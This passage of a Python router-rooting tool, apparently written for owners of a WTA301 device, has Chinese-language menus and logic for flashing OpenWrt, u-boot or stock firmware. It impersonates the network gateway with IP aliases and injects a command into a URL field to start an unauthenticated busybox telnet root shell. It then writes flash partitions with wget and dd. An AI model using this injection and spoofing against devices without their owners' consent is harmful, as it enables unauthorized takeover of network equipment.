        except (EOFError, KeyboardInterrupt):
            info("")
            return 0
        if ok not in ("y", "yes", "是"):
            return 0
        return run_cli(["--restore-bslot", "--interactive-ok"])

    if choice == "8":
        info("")
        info(__doc__)
        return 0

    if choice == "1":
        return run_cli(["--interactive-ok"])

    if choice == "2":
        pkg = ask_file("OpenWrt 完整包", "wta301-op-*.bin", PKG_TOTAL)
        if not pkg:
            return 1
        return run_cli(["--flash-op", pkg, "--interactive-ok"])

    if choice == "3":
        pkg = ask_file("u-boot kit 镜像", "wta301-uboot-*.bin", 0x40000)
        if not pkg:
            return 1
        return run_cli(["--flash-uboot", pkg, "--interactive-ok"])

    if choice == "4":
        info("")
        info("   B 槽里本来就存着一份原厂固件（kernel 0x400000 / rootfs 0xC00000），")
        info("   可以直接拷到 A 槽，不需要准备任何镜像文件。")
        info("")
        info("     [a] 自动找原厂镜像（推荐，只认 md5）")
        info("     [b] 从 B 槽拷（md5 必须是原厂值，否则拒绝）")
        info("     [f] 我自己有两个镜像文件")
        info("     [x] 返回")
        info("")
        try:
            sub = input("   选: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            info("")
            return 0
        if sub == "a":
            return run_cli(["--flash-stock", "auto", "--interactive-ok"])
        if sub == "b":
            return run_cli(["--flash-stock", "bslot", "--interactive-ok"])
        if sub == "f":
            k = ask_file("原厂内核", "mtd10_kernel_bak.bin / mtd5_kernel.bin", 0)
            if not k:
                return 1
            r = ask_file("原厂 rootfs", "mtd11_rootfs_bak.bin / mtd6_rootfs.bin", 0)
            if not r:
                return 1
            return run_cli(["--flash-stock", "files", "--stock-kernel", k,
                            "--stock-rootfs", r, "--interactive-ok"])
        return 0

    info("   ! 无效选项")
    return 1


def ask_file(label, pattern, expect_size):
    """让用户拖入/输入文件路径，并校验大小。"""
    info("")
    info("   请把 %s 拖到窗口里（或将路径粘入），回车：" % label)
    info("   文件名形如 %s" % pattern)
    try:
        path = input("   路径: ").strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        info("")
        return None
    if not path:
        return None
    if not os.path.exists(path):
        info("   ! 文件不存在: %s" % path)
        return None
    size = os.path.getsize(path)
    if expect_size and size != expect_size:
        info("   ! 文件大小 0x%x，期望 0x%x" % (size, expect_size))
        if not expect_size:
            pass
        return None
    info("   OK: %s (0x%x)" % (os.path.basename(path), size))
    return path


# ---------------------------------------------------------------------------
# CLI 入口
# ---------------------------------------------------------------------------

def run_cli(argv):
    ap = argparse.ArgumentParser(
        prog="wta301-getroot.py",
        description="一键在原厂固件上取 root；可选继续刷 OpenWrt 或 u-boot kit 到 A 槽",
        epilog="不带参数运行 = 傻瓜式菜单。带参数则走命令行。\n"
               "分区表与陷阱说明用 --explain 查看。")
    ap.add_argument("--target", default=None, help="设备 IP（默认扫 192.168.1.0/24）")
    ap.add_argument("--pc-ip", default=None, help="本机有线口 IP（默认按路由探测）")
    ap.add_argument("--timeout", type=int, default=900, help="等回连秒数，默认 900")
    ap.add_argument("--flash-op", metavar="PKG", default=None,
                    help="取到 root 后把该 OpenWrt 完整包刷进 A 槽")
    ap.add_argument("--flash-uboot", metavar="BIN", default=None,
                    help="只刷 u-boot kit 到 A 槽（保留当前固件）")
    ap.add_argument("--flash-stock", nargs="?", const="auto",
                    choices=("auto", "bslot", "files"), default=None,
                    metavar="auto|bslot|files",
                    help="刷回原厂到 A 槽。auto=自己找原厂镜像（只认 md5）；"
                         "bslot=从 B 槽拷（md5 必须等于原厂值）；"
                         "files=从 --stock-kernel / --stock-rootfs 读")
    ap.add_argument("--stock-dir", default=None, help="auto 模式优先搜索该目录")
    ap.add_argument("--restore-bslot", action="store_true",
                    help="把离线原厂镜像写回 B 槽（mtd10/mtd11），修回退出口")
    ap.add_argument("--backup", nargs="?", const="backup", default=None,
                    metavar="DIR", help="把设备各分区整片备份到 DIR（用 nc，默认 backup）")
    ap.add_argument("--verify", action="store_true",
                    help="安全审计：列出全部逃生出口，不写任何东西")
    ap.add_argument("--stock-kernel", metavar="PATH", default=None,
                    help="--flash-stock files 模式的原厂内核（4 MiB，FIT）")
    ap.add_argument("--stock-rootfs", metavar="PATH", default=None,
                    help="--flash-stock files 模式的原厂 rootfs（12 MiB，squashfs）")
    ap.add_argument("--dry-run", action="store_true", help="只打印计划，不写入")
    ap.add_argument("--keep", action="store_true", help="保留 IP 别名与防火墙规则")
    ap.add_argument("--serve-dir", default=None, help="HTTP 服务根目录")
    ap.add_argument("--reset-overlay", choices=("stock", "openwrt"), default=None,
                    metavar="{stock,openwrt}",
                    help="同时擦除指定固件的 overlay（默认不碰）")
    ap.add_argument("--explain", action="store_true", help="打印分区表与陷阱后退出")
    ap.add_argument("--yes", "-y", action="store_true", help="不等确认，直接执行")
    # 内部用：菜单跳过 argparse 的必填校验
    argv = [a for a in argv if a != "--interactive-ok"]
    args = ap.parse_args(argv)

    if args.explain:
        info(__doc__)
        return 0
    if not args.flash_op and not args.flash_uboot and not args.flash_stock:
        pass  # 只取 root
    n_modes = sum(1 for x in (args.flash_op, args.flash_uboot, args.flash_stock,
                              args.restore_bslot, args.backup) if x)
    if n_modes > 1:
        die("--flash-op / --flash-uboot / --flash-stock / --restore-bslot / --backup "
            "只能选一个")
    if args.flash_stock == "files" and not (args.stock_kernel and args.stock_rootfs):
        die("--flash-stock files 需要同时给 --stock-kernel 与 --stock-rootfs")

    return execute(args)


def execute(args):
    _utf8_stdout()

    if args.flash_op:
        what = "  +  刷入 OpenWrt(A 槽)"
    elif args.flash_uboot:
        what = "  +  刷入 u-boot kit(A 槽)"
    elif args.flash_stock:
        what = "  +  刷回原厂(A 槽)"
    elif args.restore_bslot:
        what = "  +  修 B 槽(写回原厂)"
    elif args.backup:
        what = "  +  整片备份"
    else:
        what = ""

    info("=" * 68)
    info(" WTA301 一键 getroot" + what)
    info("=" * 68)

    target = args.target
    if not target:
        info("")
        info("[0] 扫描 192.168.1.0/24 …")
        target = scan_target()
        if not target:
            die("没扫到设备。请用 --target <设备IP> 指定。")
    info("   设备: %s" % target)

    pc_ip = args.pc_ip or detect_pc_ip(target)
    if not pc_ip:
        die("探测不到本机有线口 IP，请用 --pc-ip 指定。")
    info("   本机: %s" % pc_ip)

    gw_ip = target.rsplit(".", 1)[0] + ".1"
    info("")
    info("[1] 冒充网关（加 %s 与 192.168.0.1 的 /32 别名）" % gw_ip)
    cleanup = setup_alias(sorted({gw_ip, "192.168.0.1"}), pc_ip)

    serve_dir = args.serve_dir or os.path.join(
        os.environ.get("TEMP") or "/tmp", "wta301-getroot")
    os.makedirs(serve_dir, exist_ok=True)

    pkg_name = None
    payload_path = None
    if args.flash_op:
        payload_path = _stage_file(args.flash_op, serve_dir, PKG_TOTAL, "完整包")
        pkg_name = os.path.basename(payload_path)
    elif args.flash_uboot:
        payload_path = _stage_file(args.flash_uboot, serve_dir, 0x40000, "u-boot kit")
        pkg_name = os.path.basename(payload_path)
    elif args.restore_bslot:
        info("")
        info("   搜索原厂 B 槽镜像（kernel 2868d8e9 / rootfs bf2f92ce）…")
        kset, kp, rp = find_stock_set(args.stock_dir, prefer="bslot")
        if not kset:
            info("")
            info("!! 没找到 B 槽原厂镜像。需要（两个都要）：")
            info("     mtd10_kernel_bak.bin  md5 %s" % STOCK_KNOWN_MD5["kernel"])
            info("     mtd11_rootfs_bak.bin  md5 %s" % STOCK_KNOWN_MD5["rootfs"])
            info("   放在脚本同目录、./stock/、../work/backup/、或 --stock-dir")
            return 4
        args.stock_kernel, args.stock_rootfs = kp, rp
        args.stock_set_name = kset["name"]
        _stage_any(kp, serve_dir, "B 槽原厂内核")
        _stage_any(rp, serve_dir, "B 槽原厂 rootfs")
    elif args.flash_stock in ("auto", "files"):
        if args.flash_stock == "auto":
            # auto 必须在起服务之前解析好，否则镜像不在服务目录里，设备下不到
            info("")
            info("   搜索本地原厂镜像（只认 md5，不认文件名）…")
            kset, kp, rp = find_stock_set(args.stock_dir)
            if not kset:
                info("")
                info("!! 没找到可用原厂镜像。需要下面任意一组文件（两个都要）：")
                info("     放在脚本同目录、或 ./stock/、或 ../work/backup/、或 --stock-dir")
                for st in STOCK_SETS:
                    info("       %-22s md5 %s" % (st["kernel"], st["kernel_md5"]))
                    info("       %-22s md5 %s" % (st["rootfs"], st["rootfs_md5"]))
                    info("       （%s）" % st["name"])
                return 4
            args.stock_kernel, args.stock_rootfs = kp, rp
            args.stock_set_name = kset["name"]
        for p in (args.stock_kernel, args.stock_rootfs):
            _stage_any(p, serve_dir, "原厂镜像")
    if payload_path:
        info("   镜像: %s (0x%x)" % (pkg_name, os.path.getsize(payload_path)))

    payload = "http://%s:%d/x;(/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1 &);" \
              % (pc_ip, SRV_PORT)

    info("")
    info("[2] 起 e-Link 模拟器 + HTTP 服务（同进程，退出即失效）")
    servers = Servers(target, pc_ip, payload, serve_dir, args.timeout + 600)
    servers.start()

    rc = 0
    try:
        if not wait_for_root(target, servers, args.timeout):
            info("")
            info("!! %d 秒内设备没回连。排查：" % args.timeout)
            info("   1) 设备是否在原厂固件、是否在正常运行")
            info("   2) 是否以管理员/root 运行（别名与防火墙要权限）")
            info("   3) %s 是否真的没有别的机器占用" % gw_ip)
            rc = 2
        else:
            info("")
            info("[4] 连上 root shell")
            tn = Telnet(target)
            info("   " + tn.sh("id", 1.5).strip().replace("\n", " ")[:110])

            fw, ver = detect_firmware(tn)
            if not fw:
                info("   ! 无法判定固件类型（内核 %s），中止以免写错分区" % ver)
                rc = 3
            else:
                info("   固件类型: %s" % fw)
                mtd = read_mtd(tn)
                info("   /proc/mtd 读到 %d 个分区" % len(mtd))

                if args.flash_op:
                    rc = flash_op(tn, args, fw, mtd, pc_ip, pkg_name)
                elif args.flash_uboot:
                    rc = flash_uboot(tn, args, fw, mtd, pc_ip, pkg_name)
                elif args.flash_stock:
                    rc = flash_stock(tn, args, fw, mtd, pc_ip)
                elif args.restore_bslot:
                    kset, kp, rp = find_stock_set(args.stock_dir, prefer="bslot")
                    rc = restore_bslot(tn, args, mtd, pc_ip, kset, kp, rp)
                elif args.backup:
                    rc = 0 if do_backup(tn, mtd, pc_ip, args.backup) else 5
                elif args.verify:
                    rc = do_verify(tn, mtd)
                else:
                    info("")
                    info("   分区表（仅供核对，未写入任何东西）:")
                    for idx in sorted(mtd):
                        size, name = mtd[idx]
                        info("     mtd%-2d %-18s 0x%08x" % (idx, name, size))
                    info("")
                    info("   已取得 root。要刷东西就加 --flash-op <完整包> 或 --flash-uboot <kit>")
            tn.close()
    finally:
        servers.stop()
        if args.keep:
            info("")
            info("[清理] --keep：保留别名与防火墙规则（记得手工删）")
        else:
            info("")
            info("[清理] 撤销本机改动")
            cleanup()

    info("")
    info("=" * 68)
    info(" 退出码 %d —— %s" % (rc, "成功" if rc == 0 else "失败"))
    info("=" * 68)
    return rc


def _stage_any(path, serve_dir, label):
    """把任意文件拷进 HTTP 服务目录（不校验大小）。"""
    if not path:
        die("没指定%s路径" % label)
    p = os.path.abspath(path)
    if not os.path.exists(p):
        die("找不到 %s: %s" % (label, p))
    dst = os.path.join(serve_dir, os.path.basename(p))
    if os.path.abspath(dst) != p:
        info("   复制 %s 到服务目录…" % os.path.basename(p))
        with open(p, "rb") as f, open(dst, "wb") as g:
            while True:
                b = f.read(1 << 20)
                if not b:
                    break
                g.write(b)
    info("   %s: %s (0x%x)" % (label, os.path.basename(p), os.path.getsize(p)))
    return dst


def _stage_file(path, serve_dir, expect_size, label):
    p = os.path.abspath(path)
    if not os.path.exists(p):
        die("找不到 %s: %s" % (label, p))
    size = os.path.getsize(p)
    if size != expect_size:
        die("%s 大小 0x%x，期望 0x%x" % (label, size, expect_size))
    dst = os.path.join(serve_dir, os.path.basename(p))
    if os.path.abspath(dst) != p:
        info("   复制镜像到服务目录…")
        with open(p, "rb") as f, open(dst, "wb") as g:
            while True:
                b = f.read(1 << 20)
                if not b:
                    break
                g.write(b)
    return dst


# ---------------------------------------------------------------------------
# 刷 OpenWrt
# ---------------------------------------------------------------------------

def flash_op(tn, args, fw, mtd_table, pc_ip, pkg_name):
    plan, problems = build_plan(os.path.join(
        args.serve_dir or os.path.join(os.environ.get("TEMP") or "/tmp", "wta301-getroot"),
        pkg_name), fw, mtd_table)
    if problems:
        for p in problems:
            info("   !! " + p)
        return 4
    print_plan(plan)
    if args.reset_overlay:
        _do_reset_overlay(tn, args, fw, mtd_table)
    if args.dry_run:
        info("")
        info("   --dry-run：未写入任何东西")
        return 0
    if not _confirm(args, "确认写入 A 槽？"):
        return 0
    ok, rebooted = do_flash(tn, plan, pc_ip, pkg_name)
    if not ok:
        info("")
        info("!! 写坏了，不要重启。B 槽原厂未受影响。")
        return 5
    info("")
    info("[9] 全部校验通过")
    if not rebooted:
        info("")
        info("[10] 重启")
        tn.sh("reboot", 3.0)
    info("   预期启动链：")
    info("     一级 u-boot(boot_flag=1) → 验 B 槽通过 → 载入 B 槽 u-boot(我们的 kit)")
    info("     → kit 先试 A 槽 → bootm 0x4880000 → OpenWrt")
    info("   约 40 秒后 ssh root@192.168.1.1")
    return 0


# ---------------------------------------------------------------------------
# 刷回原厂
# ---------------------------------------------------------------------------

def flash_stock(tn, args, fw, mtd_table, pc_ip):
    mode = args.flash_stock  # "auto" / "bslot" / "files"
    info("")
    info("[S1] 当前固件: %s → 目标: 把 A 槽换成原厂" % fw)

    kset = None
    kpath = rpath = None
    if mode == "bslot":
        info("   源：B 槽 mtd10/mtd11（只读）。md5 必须等于已知原厂值，否则拒绝。")
    else:
        kpath = args.stock_kernel
        rpath = args.stock_rootfs
        if mode == "auto":
            info("   源：搜索本地原厂镜像（只认 md5，不认文件名）…")
            kset, kpath, rpath = find_stock_set(args.stock_dir)
            if not kset:
                info("")
                info("!! 没找到可用原厂镜像。需要下面任意一组文件，放在：")
                info("     %s" % os.path.dirname(os.path.abspath(__file__)))
                info("   （或 --stock-dir 指定的目录、或当前目录、或 ../work/backup）")
                for s in STOCK_SETS:
                    info("     %-14s md5 %s" % (s["kernel"], s["kernel_md5"]))
                    info("     %-14s md5 %s" % (s["rootfs"], s["rootfs_md5"]))
                    info("     （%s，需两个都在）" % s["name"])
                return 4

    plan, problems = build_stock_plan(tn, mtd_table, mode, kpath, rpath, kset)
    if problems:
        info("")
        for p in problems:
            info("   !! " + p)
        return 4
    print_stock_plan(plan)
    if args.dry_run:
        info("")
        info("   --dry-run：未写入任何东西")
        return 0
    if not _confirm(args, "确认把 A 槽换成原厂固件？"):
        return 0
    ok, rebooted = do_flash_stock(tn, plan, pc_ip, mode)
    if not ok:
        info("")
        info("!! 写坏了。重启后 kit 会先试 A 槽，失败自动退到 B 槽原厂。")
        info("   如果连 B 槽都不启动（不可能，除非动了 mtd0/flag），才需要 TTL。")
        return 5
    info("")
    info("[S4] 原厂固件已写入 A 槽" + ("" if rebooted else ""))
    if not rebooted:
        info("")
        info("[S5] 重启")
        tn.sh("reboot", 3.0)
    info("   预期启动链：")
    info("     一级 u-boot(flag=1) → 验 B 槽通过 → 载入 B 槽 u-boot(我们的 kit)")
    info("     → kit 先试 A 槽 → bootm 0x4880000 → 原厂 4.x（忽略 bootargs，自带 root=/dev/mtdblock6）")
    info("   A 槽坏时 kit 自动退 image_1(0x800000) → B 槽原厂，永远不会变砖。")
    return 0


# ---------------------------------------------------------------------------
# 刷 u-boot kit
# ---------------------------------------------------------------------------

UBOOT_SLOT_LEN = 0x40000

# u-boot 槽位（两个都写，与 kit 的 tpluboot 行为一致）
UBOOT_SLOTS = [
    (4, "normal_boot"),    # 0x4700000  A 槽 u-boot（我们 boot 的就是它）
    (9, "normal_boot_bak"),  # 0x700000  B 槽 u-boot（一级 u-boot 优先载入）
]


def flash_uboot(tn, args, fw, mtd_table, pc_ip, pkg_name):
    info("")
    info("[5] u-boot kit 刷写计划")
    info("   镜像: %s (0x%x)" % (pkg_name, UBOOT_SLOT_LEN))
    info("")
    info("   目标槽（两个都写，与 kit 的 tpluboot 一致）:")
    for idx, nm in UBOOT_SLOTS:
        if idx in mtd_table:
            info("     mtd%-2d %-18s 0x%08x" % (idx, mtd_table[idx][1], mtd_table[idx][0]))
        else:
            info("     mtd%-2d %-18s (不存在)" % (idx, nm))
    info("")
    info("   !! u-boot 是 TTL 命脉。写错 = 只能拆机接串口。")
    info("      本工具不会动 mtd0（一级 u-boot），只写二级。")

    if args.dry_run:
        info("")
        info("   --dry-run：未写入任何东西")
        return 0
    if not _confirm(args, "确认写入 u-boot 两个槽？"):
        return 0

    url = "http://%s:%d/%s" % (pc_ip, SRV_PORT, pkg_name)
    info("")
    info("[6] 设备侧下载")
    out = tn.sh("cd /tmp && wget -O ub.bin '%s' 2>&1 | tail -2" % url, 12.0)
    info("   " + out.strip()[:240])
    info("")
    info("[7] 写入")
    ok = True
    for idx, nm in UBOOT_SLOTS:
        if idx not in mtd_table:
            continue
        guard_write(idx, "flash-uboot")
        out = tn.sh("dd if=/tmp/ub.bin of=/dev/mtdblock%d bs=%d count=1 2>&1"
                    % (idx, UBOOT_SLOT_LEN), 20.0)
        info("   mtd%-2d %-18s %s" % (idx, nm, out.strip().splitlines()[-1][:90] if out.strip() else ""))
    tn.sh("sync", 3.0)

    info("")
    info("[8] 回读校验")
    got = _first_md5(tn.sh("dd if=/tmp/ub.bin bs=%d count=1 2>/dev/null | md5sum"
                        % UBOOT_SLOT_LEN, 12.0))
    want = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=%d count=1 2>/dev/null | md5sum"
                         % (UBOOT_SLOTS[0][0], UBOOT_SLOT_LEN), 12.0))
    info("   源   %s" % got)
    info("   mtd%d %s" % (UBOOT_SLOTS[0][0], want))
    if got != want:
        info("   !! 不一致")
        ok = False

    if ok:
        info("")
        info("[9] u-boot 写入校验通过，不重启（当前系统继续用原 u-boot 直到下次开机）")
        return 0
    return 5


def _do_reset_overlay(tn, args, fw, mtd_table):
    o = OVERLAYS[args.reset_overlay]
    info("")
    info("[5b] 额外擦除 %s 的 overlay：%s  0x%07x 长 0x%x"
         % (args.reset_overlay, o["name"], o["start"], o["len"]))
    if o["mtd"] not in mtd_table:
        info("     ! mtd%d 不存在，跳过" % o["mtd"])
        return
    if args.dry_run:
        info("     --dry-run：未擦")
        return
    guard_write(o["mtd"], "reset-overlay")
    out = tn.sh("dd if=/dev/zero of=/dev/mtdblock%d bs=%d count=%d 2>&1 | tail -1"
                % (o["mtd"], DD_BS, o["len"] // DD_BS), 30.0)
    info("     " + out.strip()[:200])


def _confirm(args, prompt):
    if getattr(args, "yes", False):
        return True
    try:
        ans = input("\n   %s [y/N] " % prompt).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return ans in ("y", "yes", "是")


def scan_target(timeout=0.35):
    found = []
    lock = threading.Lock()

    def probe(i):
        ip = "192.168.1.%d" % i
        for port in (80, 443):
            s = socket.socket()
            s.settimeout(timeout)
            rc = s.connect_ex((ip, port))
            s.close()
            if rc == 0:
                with lock:
                    found.append((ip, port))
                return

    ts = [threading.Thread(target=probe, args=(i,)) for i in range(1, 255)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    if not found:
        return None
    # 排除我们自己：本机可能挂了 192.168.1.1 / 192.168.0.1 的 /32 别名，
    # 那些端口会响应，扫出来就成了假阳性（实测踩过：选中 192.168.1.1 后
    # 等 2323 永远等不到，因为 2323 开在设备上而不是我们本机）。
    own = {"192.168.1.1", "192.168.0.1"}
    for ip, port in sorted(found):
        info("   候选 %s:%d%s" % (ip, port, "  (本机别名，跳过)" if ip in own else ""))
    real = [x for x in sorted(found) if x[0] not in own]
    if not real:
        return None
    return real[0][0]


def detect_pc_ip(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except RefusedWrite as e:
        print()
        print("=" * 68)
        print(" 写入已被安全门禁拒绝 —— 没有写入任何分区")
        print("=" * 68)
        print("   " + str(e))
        print()
        sys.exit(6)
